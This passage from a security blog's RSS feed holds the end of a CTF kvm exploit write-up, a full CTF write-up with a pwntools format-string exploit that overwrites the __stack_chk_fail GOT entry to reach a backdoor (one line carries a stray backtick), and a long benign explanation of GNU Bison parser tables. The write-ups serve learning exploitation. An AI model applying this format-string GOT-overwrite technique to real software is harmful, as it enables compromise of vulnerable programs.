class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>对于exp几个疑惑的点：</p><ul><li><p>0x1020 ：这里我本来写的是0x1000，但是没打通，在0x7000开始处我们写了四个字段，所以我们应该先跳过这四个字段开始，经过动态调试发现返回地址只有前面三个字段有内容，其他都是0，所以一次遍历到不为0为止，然后我们add 24，跳过这三个字段就能到达ret处。</p><p><img src="https://i.loli.net/2020/09/25/tph8ysFVoinqW1f.png" alt="image-20200925232304528.png"></p></li><li><p>0x249e6 : 这里是返回地址到one_gadget地址的偏移，动态调试后发现execve_addr-ret_addr=0x249e6。</p></li></ul><p>成功利用截图：</p><p><img src="https://i.loli.net/2020/09/25/T2rDMolGOvBZkJI.png" alt="image-20200925232856994.png"></p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/01/22/[Confidence%20CTF]kvm/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[BJD2nd]r2t4</title>
      <link>https://billyotry.github.io/2021/01/22/[BJD2nd]r2t4/</link>
      <guid>https://billyotry.github.io/2021/01/22/[BJD2nd]r2t4/</guid>
      <pubDate>Thu, 21 Jan 2021 16:59:43 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;第一步当然就是日常查保护&lt;/p&gt;
&lt;p&gt;会看到堆栈不可执行还有NX保护&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/03/24/3TGJyWszCMu9dfO.png&quot; alt=&quot;image-20200323213631230.png&quot;
        
      
      </description>
      
      
      <content:encoded><![CDATA[<p>第一步当然就是日常查保护</p><p>会看到堆栈不可执行还有NX保护</p><p><img src="https://i.loli.net/2020/03/24/3TGJyWszCMu9dfO.png" alt="image-20200323213631230.png"></p><p>然后就丢进IDA，F5</p><p><img src="https://i.loli.net/2020/03/24/N7gIPZSzXCDVjsv.png" alt="image-20200323214009122.png"></p><p><img src="https://i.loli.net/2020/03/24/8djRsrFqJOf93mx.png" alt="image-20200323214325901.png"></p><p>很明显的格式化字符串，发现出题人还留了后门函数，但是这个backdoor这个英语给我整笑了。这里一开始的思路是利用栈溢出泄露canary出来后然后填在ebp-8的位置上绕过栈保护，再控制程序流程去执行后门函数。想了半天也不知道为什么，调试程序的时候发现他只有一次输入一次输入，就是说泄露的canary之后没法再把payload输进去，想了半天都不知道怎么办，甚至还一度的怀疑是出题人出错了。</p><p>后来想到了这里并不能通过格式化泄露canary来绕过栈保护，而是进入任意地址写，将后门函数写进返回地址里面，又做了好久依旧没有打通，后来经过1p0ch师傅的指点，这里应该要将后门函数写到stack_chk_fail里面。我们知道当canary被修改了之后，会触发stack_chk_fail函数，所以可以利用这一点。(不过这种操作也是第一次听说，学到了)。</p><p>接下来先看下偏移是多少</p><p><img src="https://i.loli.net/2020/03/24/aJWXOuUT9jMkFlg.png" alt="image-20200323220148164.png"></p><p>很明显看到偏移是6</p><p>那么我们接下来就可以写exp了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./r2t4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./r2t4&#x27;</span>)</span><br><span class="line">stack_addr=elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]</span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x400626</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%1574c%8$hnaaaaa&#x27;</span>+p64(`stack_addr)+<span class="string">&#x27;a&#x27;</span>*<span class="number">12</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>1574是0x626是十进制</p><p>这里偏移为8是因为’%1574c%8’为偏移6，’$hnaaaaa’为偏移7，那么要写入的p64(stack_addr)就是偏移8了。后面的aaaaa是为了对齐地址。</p><p>这里为了触发__stack_chk_fail，payload的长度就要是0x30,也就是48.</p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/01/22/[BJD2nd]r2t4/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Understanding C parsers generated by GNU Bison</title>
      <link>https://billyotry.github.io/2021/01/22/Understanding%20C%20parsers%20generated%20by%20GNU%20Bison/</link>
      <guid>https://billyotry.github.io/2021/01/22/Understanding%20C%20parsers%20generated%20by%20GNU%20Bison/</guid>
      <pubDate>Thu, 21 Jan 2021 16:59:43 GMT</pubDate>
      <description>
      
        
        
          &lt;h3 id=&quot;table分析&quot;&gt;&lt;a href=&quot;#table分析&quot; class=&quot;headerlink&quot; title=&quot;table分析&quot;&gt;&lt;/a&gt;table分析&lt;/h3&gt;&lt;p&gt;bision与flex类似，有一系列的表，理清这些表之间的关系及索引方式后能更好的理解&lt;code&gt;y
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h3 id="table分析"><a href="#table分析" class="headerlink" title="table分析"></a>table分析</h3><p>bision与flex类似，有一系列的表，理清这些表之间的关系及索引方式后能更好的理解<code>yyparse</code>。</p><h4 id="yytranslate"><a href="#yytranslate" class="headerlink" title="yytranslate"></a>yytranslate</h4><p>此表映射了token和symbol token之间的关系。如果是预定义的<code>%token</code>，则会映射到其他的token序号中；如果是普通的终结符，则会把字符对应的ascii码映射到对应token中。</p><p>例如<code>S: &#39;\n&#39; ;</code>规则在生成后如下</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* YYTRANSLATE[YYLEX] -- Bison symbol number corresponding to YYLEX.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_uint8 yytranslate[] =</span><br><span class="line">&#123;</span><br><span class="line">       <span class="number">0</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,</span><br><span class="line">       <span class="number">3</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,</span><br><span class="line">...       </span><br><span class="line">       <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">1</span>,     <span class="number">2</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>&#39;\n&#39;</code>的ascii为10,所以yytranslate[10]=3</p><p>多数映射的token为2，2是未定义，只有在语法中定义的符号才被赋予有效的符号编号。</p><p>这里的<code>&#39;\n&#39;</code>为什么是3，那是因为终结符的编号从3开始，可以通过查看输出解析器中生成的yytname数组来检查分配给各种符号的符号编号，而这里的例子符号编号如下所示。</p><table><thead><tr><th align="center"><em>Symbol</em></th><th align="center"><em>Number</em></th></tr></thead><tbody><tr><td align="center">$end</td><td align="center">0</td></tr><tr><td align="center">error</td><td align="center">1</td></tr><tr><td align="center">$undefined</td><td align="center">2</td></tr><tr><td align="center">\n</td><td align="center">3</td></tr></tbody></table><p>每当<code>yyparse()</code>需要token时，它都会调用<code>yylex</code>，然后获取对应token的symbol token内部码。</p><h4 id="yydefact"><a href="#yydefact" class="headerlink" title="yydefact"></a>yydefact</h4><p>此表存储了每个状态下对应的产生式规则的序号。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* YYDEFACT[STATE-NAME] -- Default rule to reduce with in state</span></span><br><span class="line"><span class="comment">   STATE-NUM when YYTABLE doesn&#x27;t specify something else to do.  Zero</span></span><br><span class="line"><span class="comment">   means the default is an error.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_uint8 yydefact[] =</span><br><span class="line">&#123;</span><br><span class="line">       <span class="number">0</span>,     <span class="number">2</span>,     <span class="number">0</span>,     <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>在STATE-NAME状态下，通过yydefact[STATE-NAME]来获取其对应的产生式规则的序号。</p></blockquote><p>其中，<code>0</code>号表示error。由于默认<code>($accept → L $end)</code>rule(其rule number为1)的存在，我们定义的所有rule索引都会增加1。即我们定义的第一个rule <code>S: &#39;\n&#39; ;</code>, 其rule number在此处为2。</p><h4 id="yydefgoto"><a href="#yydefgoto" class="headerlink" title="yydefgoto"></a>yydefgoto</h4><p>yydefgoto是GOTO跳转表的压缩形式。它的元素数量为语法中非终结符的数量，元素的值表示每个非终结符要跳转的状态。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* yydefgoto[nth non-terminal] = most common GOTO state for the nth non-terminal. */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_int8 yydefgoto[] =</span><br><span class="line">&#123;</span><br><span class="line">      <span class="number">-1</span>,     <span class="number">2</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>索引方式为<code>yytranslate</code>表中的符号编号减去非终结符的数目。</p><p>parser在用rule归约栈上内容的时候会查询yydefgoto，但在某些状态下会使用yytable表。</p><p>第一个非终结符<code>$accept</code>的rule为-1(即yydefgoto[0]),<code>$accept</code>不会被归约。</p><h4 id="yyr1-and-yyr2"><a href="#yyr1-and-yyr2" class="headerlink" title="yyr1 and yyr2"></a>yyr1 and yyr2</h4><p>yyr1表示每个rule左部的symbol数量，通过yyr1，当进行归约时，我们需要知道用于还原以转换为适当状态的规则的LHS符号，这就是该表使用的地方。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* YYR1[YYN] -- Symbol number of symbol that rule YYN derives.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_uint8 yyr1[] =</span><br><span class="line">&#123;</span><br><span class="line">       <span class="number">0</span>,     <span class="number">4</span>,     <span class="number">5</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>yyr2表示每个rule右部的symbol数量，</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* YYR2[YYN] -- Number of symbols composing right hand side of rule YYN.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_uint8 yyr2[] =</span><br><span class="line">&#123;</span><br><span class="line">       <span class="number">0</span>,     <span class="number">2</span>,     <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>例如<strong>rule2</strong>的<code>S: &#39;\n&#39;</code>右侧有1个symbol，因此yyr2[2]=1。在归约的时候，通过这个表中查找在对应的rule下，我们要从栈中pop出多少state来作为归约。</p><h4 id="yytable"><a href="#yytable" class="headerlink" title="yytable"></a>yytable</h4><p>yytable和yycheck, yypact, yypgoto 配合来表示当前的状态是应该放入移入中还是符合rule来进行归约。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* YYTABLE[YYPACT[STATE-NUM]].  What to do in state STATE-NUM.  If</span></span><br><span class="line"><span class="comment">   positive, shift that token.  If negative, reduce the rule which</span></span><br><span class="line"><span class="comment">   number is the opposite.  If zero, do what YYDEFACT says.</span></span><br><span class="line"><span class="comment">   If YYTABLE_NINF, syntax error.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> YYTABLE_NINF -1</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_uint8 yytable[] =</span><br><span class="line">&#123;</span><br><span class="line">       <span class="number">1</span>,     <span class="number">3</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>正数表示移入，负数表示归约，其中归约所使用的规则的number为元素的绝对值，即如果是-3，则使用rule3来进行归约。</p><h4 id="yypgoto"><a href="#yypgoto" class="headerlink" title="yypgoto"></a>yypgoto</h4><p>因为同一个非终结符，根据之前状态的不同，其跳转的状态也是不同的，那么对于存在不同情况的GOTO情况，则由yypgoto记录。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* YYPGOTO[NTERM-NUM].  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_int8 yypgoto[] =</span><br><span class="line">&#123;</span><br><span class="line">      <span class="number">-4</span>,     <span class="number">-4</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>此表的索引对应这所有的非终结符，这里分别对应<code>$accept</code>,<code>S</code>。</p><p>比如现在在rule2 (<code>S -&gt; &#39;\n&#39;</code>)归约后，栈顶的状态为4，parser会将yypgoto[S]的值(此处yypgoto[1]=-4)加上原先的状态值作为现在的状态索引，去yytable找到新的状态值，即此时状态索引为0 (4-4)， 那么yytable[0]为1，那么现在的状态就是1，被压入状态栈顶。</p><p>parser到底是用<code>yypgoto</code>还是<code>yydefgoto</code>来设置接下来的状态，将在<code>yycheck</code>中指出。</p><h4 id="yypact"><a href="#yypact" class="headerlink" title="yypact"></a>yypact</h4><p>yypact定义了在初始状态下的部分yytable。它由token标号来索引。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> YYPACT_NINF -4</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_int8 yypact[] =</span><br><span class="line">&#123;</span><br><span class="line">      <span class="number">-3</span>,    <span class="number">-4</span>,    <span class="number">1</span>,     <span class="number">-4</span>  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这是解析循环查询的第一个表，在parse循环开始的时候，如果yypact[cur-state] = YYPACT_NINF，意味着使用yydefact来进行归约，并且只有归约没有移入操作。</p><p>例如此处如果是状态1和3，则为YYPACT_NINF，只进行归约操作。</p><p>如果现在在状态0，展望符为<code>\n</code>(即3号symbol,由yytranslate可得)，那么现在的yypact[0]为-3，所以在yytable中的索引应该为<code>-3+3=0</code>, yytable[0]为1，表示移入并转移到状态1。</p><h4 id="yycheck"><a href="#yycheck" class="headerlink" title="yycheck"></a>yycheck</h4><p>yycheck主要有两个作用，一个是判断归约还是移入，一个是判断选用<code>yypgoto</code>还是<code>yydefgoto</code>跳转表。</p><h5 id="yytable-or-yydefact"><a href="#yytable-or-yydefact" class="headerlink" title="yytable or yydefact"></a>yytable or yydefact</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">YYCHECK = a <span class="built_in">vector</span> indexed in parallel with YYTABLE.  It indicates,</span><br><span class="line">   in a roundabout way, the bounds of the portion you are trying to</span><br><span class="line">   examine.</span><br><span class="line"></span><br><span class="line">   Suppose that the portion of YYTABLE starts at index P <span class="keyword">and</span> the index</span><br><span class="line">   to be examined within the portion is I.  Then <span class="keyword">if</span> YYCHECK[P+I] != I,</span><br><span class="line">   I is outside the bounds of what is actually allocated, <span class="keyword">and</span> the</span><br><span class="line">   <span class="keyword">default</span> (from YYDEFACT <span class="keyword">or</span> YYDEFGOTO) should be used.  Otherwise,</span><br><span class="line">   YYTABLE[P+I] should be used.  </span><br></pre></td></tr></table></figure><p>parse会判断yycheck[0]是否为所有有效token的symbol number, 如果不是，则进行yydefault的归约。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">yyn += yytoken;</span><br><span class="line">  <span class="keyword">if</span> (yyn &lt; <span class="number">0</span> || YYLAST &lt; yyn || yycheck[yyn] != yytoken)</span><br><span class="line">    <span class="keyword">goto</span> yydefault;</span><br></pre></td></tr></table></figure><p>此时yycheck[0]=3，而<code>\n</code>正好是3号symbol，所有我们选择<code>yytable</code>。</p><h5 id="yydefgoto-or-yypgoto"><a href="#yydefgoto-or-yypgoto" class="headerlink" title="yydefgoto or yypgoto"></a>yydefgoto or yypgoto</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">yyn = yyr1[yyn];</span><br><span class="line">yystate = yypgoto[yyn - YYNTOKENS] + *yyssp;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> &lt;= yystate &amp;&amp; yystate &lt;= YYLAST &amp;&amp; yycheck[yystate] == *yyssp)</span><br><span class="line">    yystate = yytable[yystate];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    yystate = yydefgoto[yyn - YYNTOKENS];</span><br></pre></td></tr></table></figure><p>比如现在在rule2 (<code>S -&gt; &#39;\n&#39;</code>)归约后，栈顶的状态为4，parser会将yypgoto[S]的值(此处yypgoto[1]=-4)加上原先的状态值作为现在的状态索引4-4=0，查询yycheck，如果为4，则表示状态4为特殊状态，选择yytable; 否则就用yydefgoto表来决定跳转。</p><h3 id="parse分析"><a href="#parse分析" class="headerlink" title="parse分析"></a>parse分析</h3><p>详见注释</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*全局变量*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 此变量存储展望符.  */</span></span><br><span class="line"><span class="keyword">int</span> yychar;</span><br><span class="line"><span class="comment">/* 展望符的语义值.  */</span></span><br><span class="line">YYSTYPE yylval;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> </span><br><span class="line">yyparse()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> yystate; <span class="comment">/* current state */</span></span><br><span class="line"><span class="keyword">int</span> yyn;<span class="comment">/* 这是一个通用变量！一次可能代表一种状态，下次可能代表一条规则 */</span></span><br><span class="line"><span class="keyword">int</span> yyresult;<span class="comment">/* 解析结果返回给调用者 */</span></span><br><span class="line"><span class="keyword">int</span> yytoken=<span class="number">0</span>;<span class="comment">/* current token */</span></span><br><span class="line"><span class="comment">/* The state stack: This parser does not shift symbols on to the stack. Only a stack of states is maintained. */</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">int</span> yyssa[YYINITDEPTH];<span class="comment">/*YYINITDEPTH is 200 */</span></span><br><span class="line"> <span class="keyword">int</span> *yyss = yyssa<span class="comment">/* Bottom of state stack */</span></span><br><span class="line"> <span class="keyword">int</span> *yyssp;<span class="comment">/* Top of state stack */</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">/* The semantic value stack: 该栈与状态栈平行增长。每次减少时，都会从堆栈中弹出语义值，并执行语义操作 */</span></span><br><span class="line">  YYSTYPE yyvsa[YYINITDEPTH];</span><br><span class="line">  YYSTYPE *yyvs = yyvsa;<span class="comment">/* Bottom of semantic stack */</span></span><br><span class="line">  YYSTYPE *yyvsp;<span class="comment">/* Top of semantic stack */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* POP the state and semantic stacks by N symbols - useful for reduce actions */</span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">define</span> YYPOPSTACK(N)   (yyvsp -= (N), yyssp -= (N))</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">int</span> yylen = <span class="number">0</span>;<span class="comment">/* 该变量用于归约操作中保存规则右侧的终结符长度 */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Ok done declaring variables. Set the ball rolling */</span></span><br><span class="line">  </span><br><span class="line">  yystate = <span class="number">0</span>;<span class="comment">/* Initial state */</span></span><br><span class="line">  yychar = YYEMPTY <span class="comment">/* YYEMPTY is -2 */</span></span><br><span class="line">  </span><br><span class="line">  yyssp = yyss; <span class="comment">/* Top = bottom for state stack */</span></span><br><span class="line">  yyvsp = yyvs;<span class="comment">/* Same for semantic stack */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">goto</span> yysetstate; <span class="comment">/* Well, gotos are used for extracting maximum performance. */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Each label can be thought of as a function */</span></span><br><span class="line">  </span><br><span class="line">  yynewstate:  <span class="comment">/* Push a new state on the stack */</span></span><br><span class="line">  </span><br><span class="line">  yyssp ++;<span class="comment">/*Just increment the stack top; actual &#x27;pushing&#x27; will happen in yysetstate */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  yysetstate:</span><br><span class="line">  </span><br><span class="line">  *yyssp = yystate;<span class="comment">/* Ok pushed state on state stack top */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">goto</span> yybackup;<span class="comment">/* This is where you will find some action */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  yybackup:<span class="comment">/* The main parsing code starts here */</span></span><br><span class="line">  </span><br><span class="line">  yyn = yypact[yystate];<span class="comment">/* Refer to what yypact is saying about the current state */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ( yyn == YYPACT_NINF) <span class="comment">/* If negative infinity its time for a default reduction */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">goto</span> yydefault;<span class="comment">/* This label implements default reductions; see below */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Check if we have a look-ahead token ready. This is LALR(1) parsing */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (yychar == YYEMPTY)</span><br><span class="line">  </span><br><span class="line">  yychar = YYLEX; <span class="comment">/* Macro YYLEX is defined as yylex() */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (yychar &lt;= YYEOF) <span class="comment">/* YYEOF is 0 - the token returned by lexer at end of input */</span></span><br><span class="line">  </span><br><span class="line">  yychar = yytoken = YYEOF; <span class="comment">/* set all to EOF */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  </span><br><span class="line">  yytoken = yytranslate[yychar];<span class="comment">/* Translate the lexer token into internal symbol number */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Now we have a look-ahead token. Let the party begin ! */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  yyn = yyn + yytoken;<span class="comment">/* This is yypact[yystate] + yytoken */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Observe this check carefully. We are checking that yyn is within the bounds of yytable</span></span><br><span class="line"><span class="comment">   * and also if yycheck contains the current token number.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> ( yyn &lt; <span class="number">0</span> || YYLAST &lt; yyn  || yycheck[yyn] != yytoken )<span class="comment">/* YYLAST is the highest index in yytable */</span></span><br><span class="line">     </span><br><span class="line">  <span class="keyword">goto</span> yydefault; <span class="comment">/* Its time for a default reduction */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Ok, yyn is within bounds of yytable */</span></span><br><span class="line">  </span><br><span class="line">  yyn = yytable[yyn];<span class="comment">/* This is yytable[ yypact[yystate] + yytoken ] */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (yyn &lt;= <span class="number">0</span>)<span class="comment">/* If yytable happens to contain a -ve value, its not a shift - its a reduce */</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">if</span> (yyn == <span class="number">0</span> || yyn == YYTABLE_NINF)<span class="comment">/* But check for out of bounds condition*/</span></span><br><span class="line">  <span class="keyword">goto</span> yyerrlab;<span class="comment">/* Label to handle errors */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Other wise reduce with rule # -yyn */</span></span><br><span class="line">  </span><br><span class="line">  yyn = -yyn;</span><br><span class="line">  <span class="keyword">goto</span> yyreduce; <span class="comment">/* Label to implement reductions */</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Last check: See if we reached final state! */</span></span><br><span class="line">  <span class="keyword">if</span> (yyn == YYFINAL)<span class="comment">/* YYFINAL is 8 in our case */</span></span><br><span class="line">  YYACCEPT;<span class="comment">/* macro deined as &#x27;goto acceptlab - a label to finish up */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* That completes all checks; If we reached here, there is no other option but to shift */</span></span><br><span class="line">  </span><br><span class="line">  yystate = yyn;<span class="comment">/* Now, yyn (= yytable[ yypact[yystate] + yytoken ]) is a state that has to be pushed */</span></span><br><span class="line">  </span><br><span class="line">  *++yyvsp = yylval; <span class="comment">/* Push the semantic value of the symbol on the semantic stack */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">goto</span> yynewstate;<span class="comment">/* This will increment state stack top and the following yysetstate that will do the pushing */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  yydefault:<span class="comment">/* A label to implement default reductions */</span></span><br><span class="line">  </span><br><span class="line">  yyn = yydefact[yystate];<span class="comment">/* Get the default reduction rule for this state */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ( yyn == <span class="number">0</span> )<span class="comment">/* This state has no default reduction. Something is wrong */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">goto</span> yyerrlab;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">goto</span> yyreduce;<span class="comment">/* Ok, got the default reduction rule # in yyn; go ahead and reduce the stack */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  yyreduce:<span class="comment">/* A lablel that implements reductions on stack. */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* By the time we are here, yyn contains the rule# to use for reducing the stack. */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Steps for reduction:</span></span><br><span class="line"><span class="comment">   * 1. Find the length of RHS of rule #yyn</span></span><br><span class="line"><span class="comment">   * 2. Execute any semantic actions by taking the values from the semantic stack</span></span><br><span class="line"><span class="comment">   * 3. POP &#x27;length&#x27; symbols from the state stack and &#x27;length&#x27; values from semantic stack</span></span><br><span class="line"><span class="comment">   * 4. Find the LHS of rule #yyn</span></span><br><span class="line"><span class="comment">   * 5. Find the GOTO of state currently on top of stack on LHS symbol</span></span><br><span class="line"><span class="comment">   * 6. Push that state on top of stack</span></span><br><span class="line"><span class="comment">   * </span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   </span><br><span class="line">   yylen = yyr2[yyn];<span class="comment">/* Get length of RHS */</span></span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* Default semantic action - $$=$1 */</span></span><br><span class="line">   yyval = yyvsp[<span class="number">1</span>-yylen];</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* Execute semantic actions */</span></span><br><span class="line">   <span class="keyword">switch</span> ( yyn )<span class="comment">/* Each rule has its own semantic action */</span></span><br><span class="line">   &#123;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">default</span>:<span class="keyword">break</span>;<span class="comment">/* We didn&#x27;t have any semantic actions in the grammar.*/</span></span><br><span class="line">   </span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   YYPOPSTACK (yylen);<span class="comment">/* This will pop both state and semantic stacks. See definition of this macro above */</span></span><br><span class="line">   </span><br><span class="line">   yylen = <span class="number">0</span>;<span class="comment">/* re-initialize yylen */</span></span><br><span class="line">   </span><br><span class="line">   *++yyvsp  = yyval;<span class="comment">/* Push the result of semantic evaluation on top of semantic stack */</span></span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* Now shift the result of reduction (steps 4 - 6) */</span></span><br><span class="line">   </span><br><span class="line">   yyn = yyr1[yyn];<span class="comment">/* Reuse yyn at every opportunity.  For now, yyn is the LHS symbol (number) of the rule */</span></span><br><span class="line">   </span><br><span class="line"> <span class="comment">/* First check for anomalous GOTOs, otherwise use Default GOTO (YYDEFGOTO)</span></span><br><span class="line"><span class="comment">  * </span></span><br><span class="line"><span class="comment">  * Observe that if we subtract no. of terminals (YYNTOKENS) from symbol number of a nonterminal, we get</span></span><br><span class="line"><span class="comment">  * an index into yypgoto or yydefgoto for that non-terminal.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  </span><br><span class="line">   yystate = yypgoto[yyn - YYNTOKENS] + *yyssp;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* A couple of checks are needed before we know this is not a default GOTO</span></span><br><span class="line"><span class="comment">    * 1. yystate must be within bounds of yytable. ( 0 to YYLAST )</span></span><br><span class="line"><span class="comment">    * 2. yycheck must contain the state currently on top of the stack</span></span><br><span class="line"><span class="comment">    */</span>   </span><br><span class="line">   <span class="keyword">if</span> ( <span class="number">0</span> &lt;= yystate &amp;&amp; yystate &lt;= YYLAST &amp;&amp; yycheck[yystate] = *yyssp)</span><br><span class="line">   </span><br><span class="line">   yystate = yytable[yystate];<span class="comment">/* Take the GOTO from yytable */</span></span><br><span class="line">   </span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   </span><br><span class="line">   yystate = yydefgoto[yyn - YYNTOKENS];<span class="comment">/* Otherwise use the default GOTO */</span></span><br><span class="line">   </span><br><span class="line">   <span class="keyword">goto</span> yynewstate;<span class="comment">/* Simply push the newly found state on top of stack and continue */</span></span><br><span class="line">   </span><br><span class="line">&#125;<span class="comment">/* End of yyparse() */</span></span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总的来说和flex类似，其实也是通过一系列的表来驱动。</p><h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p><a href="https://www.cs.uic.edu/~spopuri/cparser.html#lr-parser">https://www.cs.uic.edu/~spopuri/cparser.html#lr-parser</a></p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/01/22/Understanding%20C%20parsers%20generated%20by%20GNU%20Bison/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
